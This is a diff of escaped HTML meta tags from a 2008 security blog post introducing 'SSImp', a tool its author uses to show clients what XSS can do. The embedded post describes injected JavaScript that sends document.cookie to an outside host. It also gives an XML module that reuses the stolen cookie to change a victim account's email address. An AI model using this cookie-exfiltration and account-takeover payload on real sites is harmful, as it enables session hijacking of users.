@@ -110,33 +110,33 @@ Usually when one wast to illustrate an XSS vulnerability ...">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="An XML based XSS PoC platform">
 <meta name="twitter:description" content="Well, long time no post. Been in hospital. Been busy with college. Life gets in the way of hacking.
-Usually when one wast to illustrate an XSS vulnerability there are two approaches. The first is to show the client the XSS and assume that they know and understand the impact. The second is to write a fully fledged exploit which takes some form of action on the client's server so that they can see the truly devastating impact. I frequently find that the second of these options is the only possible way to draw attention to the problems of XSS, but I have also grown very tired of having to write these from scratch, setting up cookie loggers etc.
+Usually when one wast to illustrate an XSS vulnerability there are two approaches. The first is to show the client the XSS and assume that they know and understand the impact. The second is to write a fully fledged exploit which takes some form of action on the client&#39;s server so that they can see the truly devastating impact. I frequently find that the second of these options is the only possible way to draw attention to the problems of XSS, but I have also grown very tired of having to write these from scratch, setting up cookie loggers etc.
 The solution that I have come up with is called the ServerSideImpersonator or SSImp.
-Here's how it works:
+Here&#39;s how it works:
 
 Find an injection point.
-Craft the javascript so that it opens an iframe to http://host/SSImp/?module=the_module&amp;action=the_action&amp;cookie=document.cookie
+Craft the javascript so that it opens an iframe to http://host/SSImp/?module=the_module&amp;amp;action=the_action&amp;amp;cookie=document.cookie
 Write a module that does what you want.
 
 To explain what happens then...
 The server side script on http://host then crafts http requests using the cookie provided in the cookie querystring to carry out remote actions on the server which is far easier than tinkering around using JavaScript and having the Same Origin Policy getting in the way etc. It also avoids the time delay that usually prevents cookie stealing from being effective.
-Here's an example of a test module that I recently created:
+Here&#39;s an example of a test module that I recently created:
 
-&lt;?xml version="1.0" encoding="utf-8" ?&gt;
-&lt;modules&gt;
-	&lt;action name="the_action"&gt;
-		&lt;requires type="querystring" name="cookie" /&gt;
-		&lt;request url="https://www.victim.com/getauserid.php" type="get"&gt;
-			&lt;setcookie type="querystring" name="cookie" /&gt;
-			&lt;storevariable name="userid" type="regex" pattern="UserID=(\d+)" group="1" /&gt;
-		&lt;/request&gt;
-		&lt;request url="https://www.victim.com/settings.php" type="post"&gt;
-			&lt;setcookie type="querystring" name="cookie" /&gt;
-			&lt;postdata value="Email=username%40gmail.com&amp;amp;UserID=[VAR:userid]&amp;amp;action=new+email"&gt;&lt;/postdata&gt;
-		&lt;/request&gt;
-		&lt;output&gt;UserID="[VAR:userid]".&lt;/output&gt;
-	&lt;/action&gt;
-&lt;/modules&gt;
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&amp;gt;
+&amp;lt;modules&amp;gt;
+	&amp;lt;action name=&quot;the_action&quot;&amp;gt;
+		&amp;lt;requires type=&quot;querystring&quot; name=&quot;cookie&quot; /&amp;gt;
+		&amp;lt;request url=&quot;https://www.victim.com/getauserid.php&quot; type=&quot;get&quot;&amp;gt;
+			&amp;lt;setcookie type=&quot;querystring&quot; name=&quot;cookie&quot; /&amp;gt;
+			&amp;lt;storevariable name=&quot;userid&quot; type=&quot;regex&quot; pattern=&quot;UserID=(\d+)&quot; group=&quot;1&quot; /&amp;gt;
+		&amp;lt;/request&amp;gt;
+		&amp;lt;request url=&quot;https://www.victim.com/settings.php&quot; type=&quot;post&quot;&amp;gt;
+			&amp;lt;setcookie type=&quot;querystring&quot; name=&quot;cookie&quot; /&amp;gt;
+			&amp;lt;postdata value=&quot;Email=username%40gmail.com&amp;amp;amp;UserID=[VAR:userid]&amp;amp;amp;action=new+email&quot;&amp;gt;&amp;lt;/postdata&amp;gt;
+		&amp;lt;/request&amp;gt;
+		&amp;lt;output&amp;gt;UserID=&quot;[VAR:userid]&quot;.&amp;lt;/output&amp;gt;
+	&amp;lt;/action&amp;gt;
+&amp;lt;/modules&amp;gt;
 ">
 
 <meta name="twitter:image" content="https://eve.gd/images/geek.png">
@@ -146,33 +146,33 @@ Here's an example of a test module that I recently created:
 
 <!-- Additional Useful Meta Tags -->
 <meta name="description" content="Well, long time no post. Been in hospital. Been busy with college. Life gets in the way of hacking.
-Usually when one wast to illustrate an XSS vulnerability there are two approaches. The first is to show the client the XSS and assume that they know and understand the impact. The second is to write a fully fledged exploit which takes some form of action on the client's server so that they can see the truly devastating impact. I frequently find that the second of these options is the only possible way to draw attention to the problems of XSS, but I have also grown very tired of having to write these from scratch, setting up cookie loggers etc.
+Usually when one wast to illustrate an XSS vulnerability there are two approaches. The first is to show the client the XSS and assume that they know and understand the impact. The second is to write a fully fledged exploit which takes some form of action on the client&#39;s server so that they can see the truly devastating impact. I frequently find that the second of these options is the only possible way to draw attention to the problems of XSS, but I have also grown very tired of having to write these from scratch, setting up cookie loggers etc.
 The solution that I have come up with is called the ServerSideImpersonator or SSImp.
-Here's how it works:
+Here&#39;s how it works:
 
 Find an injection point.
-Craft the javascript so that it opens an iframe to http://host/SSImp/?module=the_module&amp;action=the_action&amp;cookie=document.cookie
+Craft the javascript so that it opens an iframe to http://host/SSImp/?module=the_module&amp;amp;action=the_action&amp;amp;cookie=document.cookie
 Write a module that does what you want.
 
 To explain what happens then...
 The server side script on http://host then crafts http requests using the cookie provided in the cookie querystring to carry out remote actions on the server which is far easier than tinkering around using JavaScript and having the Same Origin Policy getting in the way etc. It also avoids the time delay that usually prevents cookie stealing from being effective.
-Here's an example of a test module that I recently created:
+Here&#39;s an example of a test module that I recently created:
 
-&lt;?xml version="1.0" encoding="utf-8" ?&gt;
-&lt;modules&gt;
-	&lt;action name="the_action"&gt;
-		&lt;requires type="querystring" name="cookie" /&gt;
-		&lt;request url="https://www.victim.com/getauserid.php" type="get"&gt;
-			&lt;setcookie type="querystring" name="cookie" /&gt;
-			&lt;storevariable name="userid" type="regex" pattern="UserID=(\d+)" group="1" /&gt;
-		&lt;/request&gt;
-		&lt;request url="https://www.victim.com/settings.php" type="post"&gt;
-			&lt;setcookie type="querystring" name="cookie" /&gt;
-			&lt;postdata value="Email=username%40gmail.com&amp;amp;UserID=[VAR:userid]&amp;amp;action=new+email"&gt;&lt;/postdata&gt;
-		&lt;/request&gt;
-		&lt;output&gt;UserID="[VAR:userid]".&lt;/output&gt;
-	&lt;/action&gt;
-&lt;/modules&gt;
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&amp;gt;
+&amp;lt;modules&amp;gt;
+	&amp;lt;action name=&quot;the_action&quot;&amp;gt;
+		&amp;lt;requires type=&quot;querystring&quot; name=&quot;cookie&quot; /&amp;gt;
+		&amp;lt;request url=&quot;https://www.victim.com/getauserid.php&quot; type=&quot;get&quot;&amp;gt;
+			&amp;lt;setcookie type=&quot;querystring&quot; name=&quot;cookie&quot; /&amp;gt;
+			&amp;lt;storevariable name=&quot;userid&quot; type=&quot;regex&quot; pattern=&quot;UserID=(\d+)&quot; group=&quot;1&quot; /&amp;gt;
+		&amp;lt;/request&amp;gt;
+		&amp;lt;request url=&quot;https://www.victim.com/settings.php&quot; type=&quot;post&quot;&amp;gt;
+			&amp;lt;setcookie type=&quot;querystring&quot; name=&quot;cookie&quot; /&amp;gt;
+			&amp;lt;postdata value=&quot;Email=username%40gmail.com&amp;amp;amp;UserID=[VAR:userid]&amp;amp;amp;action=new+email&quot;&amp;gt;&amp;lt;/postdata&amp;gt;
+		&amp;lt;/request&amp;gt;
+		&amp;lt;output&amp;gt;UserID=&quot;[VAR:userid]&quot;.&amp;lt;/output&amp;gt;
+	&amp;lt;/action&amp;gt;
+&amp;lt;/modules&amp;gt;
 ">
 <meta property="article:published_time" content="2008-02-02 16:57:44 +0000">
 <meta property="article:author" content="Martin Paul Eve">
